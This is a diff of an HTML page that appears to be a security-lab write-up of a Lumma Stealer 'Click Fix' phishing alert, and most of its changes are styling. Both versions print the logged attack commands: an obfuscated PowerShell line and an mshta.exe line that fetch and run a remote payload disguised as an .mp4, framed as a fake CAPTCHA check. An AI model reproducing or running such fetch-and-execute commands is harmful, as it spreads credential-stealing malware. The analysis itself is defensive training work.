@@ -727,7 +727,7 @@
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    LOLbins
+    LOLBins
   </span>
 </span>
 
@@ -1041,16 +1041,16 @@
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">EventID :              316
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Event Time :           Mar, 13, 2025, 09:44 AM
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Rule :                 SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Level :                Security Analyst
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">SMTP Address :         132.232.40.201
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Source Address :       update@windows-update.site
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">Destination Address :  dylan@letsdefend.io
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">E-mail Subject :       Upgrade your system to Windows 11 Pro for FREE
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Device Action :        Allowed
-</span></span><span class="line"><span class="ln">10</span><span class="cl">Trigger Reason :       Redirected site contains a click fix type script for Lumma Stealer distribution.</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>EventID :              316
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>Event Time :           Mar, 13, 2025, 09:44 AM
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>Rule :                 SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>Level :                Security Analyst
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>SMTP Address :         132.232.40.201
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>Source Address :       update@windows-update.site
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>Destination Address :  dylan@letsdefend.io
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>E-mail Subject :       Upgrade your system to Windows 11 Pro for FREE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>Device Action :        Allowed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>Trigger Reason :       Redirected site contains a click fix type script for Lumma Stealer distribution.</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Identification</span>
     <div id="identification" class="anchor"></div>
@@ -1134,19 +1134,19 @@
     
 </h4>
 <p>This is a <strong>Click Fix</strong> phishing attack - a technique where a malicious webpage presents a fake CAPTCHA or verification prompt instructing the user to manually copy and paste a PowerShell command into a Run dialog or terminal. The &ldquo;I am not a robot - reCAPTCHA Verification ID&rdquo; string embedded in the command confirms this pattern. The page presented the user with an obfuscated command disguised as a verification step:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">Mar</span> <span class="mf">13</span> <span class="mf">2025</span> <span class="mf">23</span><span class="err">:</span><span class="mf">26</span><span class="err">:</span><span class="mf">19</span>
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">&#34;C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe&#34;</span> <span class="n">-w</span> <span class="mf">1</span> <span class="n">powershell</span> <span class="n">-Command</span>
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">(</span><span class="s1">&#39;ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4&#39;</span> <span class="o">-replace</span> <span class="s1">&#39;]&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c"># ✅ &#39;&#39;I am not a robot - reCAPTCHA Verification ID: 3824</span>
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">Mar</span> <span class="mf">13</span> <span class="mf">2025</span> <span class="mf">23</span><span class="err">:</span><span class="mf">26</span><span class="err">:</span><span class="mf">31</span>
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s2">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> <span class="n">-Command</span>
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s2">&#34;mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4&#34;</span>
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
-</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Mar</span> <span class="mf">13</span> <span class="mf">2025</span> <span class="mf">23</span><span class="err">:</span><span class="mf">26</span><span class="err">:</span><span class="mf">32</span>
-</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="s2">&#34;C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe&#34;</span> <span class="n">-w</span> <span class="mf">1</span> <span class="n">powershell</span> <span class="n">-Command</span>
-</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">(</span><span class="s1">&#39;ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4&#39;</span> <span class="o">-replace</span> <span class="s1">&#39;]&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c"># ✅ &#39;&#39;I am not a robot - reCAPTCHA Verification ID: 3824&#39;&#39;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>Mar <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">2025</span> <span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">19</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#e6db74">&#34;C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe&#34;</span> -w <span style="color:#ae81ff">1</span> powershell -Command
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>(<span style="color:#e6db74">&#39;ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4&#39;</span> <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#39;]&#39;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#75715e"># ✅ &#39;&#39;I am not a robot - reCAPTCHA Verification ID: 3824</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>Mar <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">2025</span> <span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">31</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#e6db74">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> -Command
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#e6db74">&#34;mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>Mar <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">2025</span> <span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#e6db74">&#34;C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe&#34;</span> -w <span style="color:#ae81ff">1</span> powershell -Command
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>(<span style="color:#e6db74">&#39;ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4&#39;</span> <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#39;]&#39;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#75715e"># ✅ &#39;&#39;I am not a robot - reCAPTCHA Verification ID: 3824&#39;&#39;</span></span></span></code></pre></div></div>
 <p>The <code>-replace ']'</code> call strips the bracket characters used to obfuscate <code>mshta.exe</code>, producing a clean command. <strong>mshta.exe</strong> is a legitimate Windows binary used to execute HTML Applications - abusing it as a LOLBin allows the attacker to fetch and execute remote content without writing a traditional executable to disk. The payload URL <code>https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4</code> disguises the payload as a video file.</p>
 <p>Network activity confirmed mshta.exe (PID 7284) made a GET request to the payload URL.</p>
 <p><figure><img
